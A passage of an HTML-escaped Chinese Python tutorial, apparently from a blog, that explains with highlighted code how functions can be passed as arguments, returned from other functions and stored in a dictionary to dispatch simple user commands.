&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上例中，&lt;code&gt;bar&lt;&#x2F;code&gt;函数被当作&lt;code&gt;foo&lt;&#x2F;code&gt;函数的实参传递给形参&lt;code&gt;b&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;函数可以当做函数的返回值&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;bar function&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  					&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; &amp;lt;function bar at 0x00FA3A98&amp;gt;  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  						&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; bar function  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上例中，&lt;code&gt;foo&lt;&#x2F;code&gt;函数返回的是&lt;code&gt;bar&lt;&#x2F;code&gt;函数，&lt;code&gt;foo&lt;&#x2F;code&gt;函数将结果赋值给&lt;code&gt;f&lt;&#x2F;code&gt;。在第6行打印的时候可以看到打印的&lt;code&gt;bar&lt;&#x2F;code&gt;函数的内存地址，那么变量f加括号相当于&lt;code&gt;bar&lt;&#x2F;code&gt;函数加括号，执行&lt;code&gt;bar&lt;&#x2F;code&gt;函数的&lt;code&gt;print&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;函数可以当做容器类型的元素&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;通过与用户交互，模拟文件的增删改查操作，每个函数对应不同的操作，暂时用打印来代替具体的操作。通过这个练习来理解为什么说函数可以当做容器类型的元素。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;add&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;add function&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;update&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;update function&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;select&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;select function&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;delete&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;delete function&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;dict&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-begin z-python&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;add&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;add&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;update&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;update&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;select&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;select&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;delete&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;delete&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-end z-python&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-loop z-while z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-loop z-while z-python&quot;&gt;while&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-block z-loop z-while z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cmd&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;input&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;Enter command: &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;strip&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
